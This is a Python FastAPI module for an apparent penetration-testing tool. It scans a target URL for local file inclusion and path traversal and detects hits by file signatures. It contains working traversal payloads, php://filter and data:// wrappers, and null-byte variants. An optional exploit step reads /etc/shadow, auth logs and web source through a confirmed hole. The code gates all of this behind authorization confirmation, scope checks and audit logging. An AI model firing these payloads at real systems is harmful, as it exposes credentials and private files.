"""LFI / Path Traversal — payload sweep + signature detection.

WS  /ws/lfi
    client -> server:
        {"url":"...FUZZ...", "method","body","headers","cookies",
         "allow_private":false, "rate_per_sec":5,
         "exploit":false, "confirm_auth":true}
"""
from __future__ import annotations

import asyncio
import base64
import logging
import time

from urllib.parse import urlparse

from fastapi import APIRouter, WebSocket, WebSocketDisconnect

from lib import audit_log, scope, web_fuzz
from lib.errors import ErrorCode, MhpError, ws_error
from lib.mode import get_mode
from lib.validators import validate_url

logger = logging.getLogger(__name__)

router = APIRouter(tags=["lfi"])

# Traversal depth variants × encodings × targets
TARGETS = ["etc/passwd"]
PREFIXES = [
    "../" * n + "" for n in range(1, 9)
]
PREFIXES_ENC = [p.replace("../", "%2e%2e%2f") for p in PREFIXES]
PREFIXES_DOUBLE_ENC = [p.replace("../", "%252e%252e%252f") for p in PREFIXES]
ABSOLUTE = ["/etc/passwd", "/proc/self/environ", "/proc/self/cmdline"]

PHP_WRAPPERS = [
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/convert.base64-encode/resource=index",
    "php://filter/read=convert.base64-encode/resource=config.php",
    "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
]

WINDOWS = [
    "C:\\windows\\win.ini",
    "..\\..\\..\\..\\..\\..\\windows\\win.ini",
    "../../../../../../../../windows/win.ini",
]

PASSWD_SIG = r"root:[x*!]:0:0:"
WININI_SIG = r"\[fonts\]|\[extensions\]"
ENVIRON_SIG = r"\bPATH=\b"


def build_payloads() -> list[str]:
    out: list[str] = []
    for pre in PREFIXES + PREFIXES_ENC + PREFIXES_DOUBLE_ENC:
        for t in TARGETS:
            out.append(pre + t)
    out.extend(ABSOLUTE)
    out.extend(WINDOWS)
    out.extend(PHP_WRAPPERS)
    # Null-byte legacy (PHP < 5.3.4)
    for p in [pre + t for pre in PREFIXES[:4] for t in TARGETS]:
        out.append(p + "%00")
        out.append(p + ".jpg")
    return out


def classify(body: str, payload: str) -> tuple[str, str] | None:
    """Return (kind, evidence-snippet) if a known signature is present."""
    if "filter/convert.base64-encode" in payload or "filter/read=convert.base64-encode" in payload:
        # Look for base64 body that decodes to PHP/source
        # We look for long ASCII base64 followed by ==. Decode and check for <?php.
        import re
        m = re.search(r"([A-Za-z0-9+/=]{200,})", body)
        if m:
            try:
                decoded = base64.b64decode(m.group(1) + "===", validate=False)[:200]
                if b"<?" in decoded or b"<?php" in decoded:
                    return ("php-source", decoded.decode("utf-8", errors="replace")[:200])
            except Exception:
                pass
    hit = web_fuzz.regex_first(body, [PASSWD_SIG])
    if hit:
        return ("etc-passwd", body[max(0, body.find(hit.split(":")[0]) - 5):][:400])
    hit = web_fuzz.regex_first(body, [WININI_SIG])
    if hit:
        return ("win-ini", body[max(0, body.lower().find(hit.lower().split("|")[0]) - 5):][:400])
    hit = web_fuzz.regex_first(body, [ENVIRON_SIG])
    if hit:
        return ("proc-environ", body[:400])
    return None


@router.websocket("/ws/lfi")
async def lfi_ws(ws: WebSocket) -> None:
    await ws.accept()
    stop = asyncio.Event()
    audit_id: str | None = None

    async def listen_for_stop() -> None:
        try:
            while True:
                msg = await ws.receive_json()
                if isinstance(msg, dict) and msg.get("action") == "stop":
                    stop.set(); return
        except Exception:
            stop.set()

    try:
        init = await ws.receive_json()
        engagement_id = init.get("engagement_id") or None
        url = str(init.get("url", "")).strip()
        try:
            url = validate_url(url, field="url")
        except MhpError as exc:
            await ws.send_json(ws_error(exc.code, exc.message))
            await ws.close(); return
        tmpl = web_fuzz.FuzzTemplate(
            url=url,
            method=str(init.get("method", "GET")).upper(),
            body=str(init.get("body", "")),
            headers=dict(init.get("headers") or {}),
            cookies=dict(init.get("cookies") or {}),
        )
        if not tmpl.has_marker():
            await ws.send_json(ws_error(
                ErrorCode.BAD_REQUEST,
                f"Place '{web_fuzz.DEFAULT_MARKER}' where payloads go",
            ))
            await ws.close(); return
        if not bool(init.get("confirm_auth", False)):
            await ws.send_json(ws_error(
                ErrorCode.NEED_CONFIRM,
                "Confirm you have authorization to test this target",
            ))
            await ws.close(); return

        confirm = bool(init.get("confirm", False))
        init_mode = str(init.get("mode", "")).strip().lower()
        mode = "engagement" if init_mode == "engagement" else (
            "lab" if init_mode == "lab" else get_mode(ws)
        )
        host_for_scope = urlparse(url).hostname or url
        if not await scope.enforce_ws(ws, host_for_scope, engagement_id, mode, confirm=confirm, active=True, action="lfi"):
            return

        allow_private = bool(init.get("allow_private", False))
        ok, reason = web_fuzz.check_scope(url, allow_private)
        if not ok:
            await ws.send_json(ws_error(ErrorCode.TARGET_DENIED, reason))
            await ws.close(); return

        rate = max(1, min(int(init.get("rate_per_sec", 5)), 20))
        do_exploit = bool(init.get("exploit", False))
        payloads = build_payloads()
        try:
            audit_id = audit_log.start(
                tool="lfi", target=url,
                argv=[tmpl.method, url, f"payloads={len(payloads)}",
                      f"exploit={do_exploit}", f"rate={rate}/s"],
                engagement_id=engagement_id,
            )
        except Exception:
            logger.exception("audit_log.start failed (scan continues)")
        await ws.send_json({"type": "started", "url": url,
                            "total_payloads": len(payloads),
                            "audit_id": audit_id})

        listener = asyncio.create_task(listen_for_stop())
        t0 = time.monotonic()
        done = 0
        findings = 0
        total = len(payloads)
        confirmed_payloads: list[str] = []

        async def on_result(r: web_fuzz.FuzzResponse) -> None:
            nonlocal done, findings
            done += 1
            cls = classify(r.body, r.payload)
            await ws.send_json({"type": "attempt", "payload": r.payload,
                                "status": r.status, "length": r.length,
                                "elapsed_ms": r.elapsed_ms,
                                "hit": cls[0] if cls else None})
            if cls:
                kind, evidence = cls
                findings += 1
                confirmed_payloads.append(r.payload)
                await ws.send_json({
                    "type": "finding", "severity": "high", "kind": kind,
                    "payload": r.payload, "evidence": evidence,
                    "confirmed": True,
                })
            if done % 4 == 0 or done == total:
                await ws.send_json({"type": "progress",
                                    "done": done, "total": total, "findings": findings})

        await web_fuzz.run_payloads(tmpl, payloads, on_result,
                                    concurrency=4, rate_per_sec=rate, stop=stop)

        # Exploit: try a handful of high-value paths through the first confirmed payload
        if do_exploit and confirmed_payloads and not stop.is_set():
            base = confirmed_payloads[0]
            # If base was etc/passwd traversal, swap target file
            if base.endswith("etc/passwd"):
                pre = base[:-len("etc/passwd")]
                targets = ["etc/shadow", "etc/hosts", "etc/issue",
                           "proc/self/environ", "var/log/auth.log",
                           "var/www/html/index.php"]
                for tgt in targets:
                    if stop.is_set():
                        break
                    p = pre + tgt
                    r = await web_fuzz.baseline(tmpl, sentinel=p)
                    if r.status and r.status < 500 and r.length > 0:
                        await ws.send_json({
                            "type": "finding", "severity": "high",
                            "kind": "exploit", "payload": p,
                            "evidence": r.body[:600], "confirmed": True,
                        })

        listener.cancel()
        elapsed = round(time.monotonic() - t0, 2)
        await ws.send_json({"type": "done", "elapsed": elapsed,
                            "findings": findings, "stopped": stop.is_set()})
        if audit_id:
            summary = f"{findings} findings, {done}/{total} payloads, {elapsed}s"
            try:
                if stop.is_set():
                    audit_log.stopped(audit_id, summary=summary)
                else:
                    audit_log.complete(audit_id, summary=summary)
            except Exception:
                logger.exception("audit_log finalize failed")
    except WebSocketDisconnect:
        stop.set()
        if audit_id:
            try: audit_log.stopped(audit_id, summary="client disconnected")
            except Exception: pass
    except Exception as exc:
        logger.exception("lfi_ws unhandled exception")
        if audit_id:
            try: audit_log.error(audit_id, f"{type(exc).__name__}: {exc}")
            except Exception: pass
        try:
            await ws.send_json(ws_error(
                ErrorCode.INTERNAL,
                "internal error during LFI scan",
            ))
        except Exception:
            pass
    finally:
        try:
            await ws.close()
        except Exception:
            pass
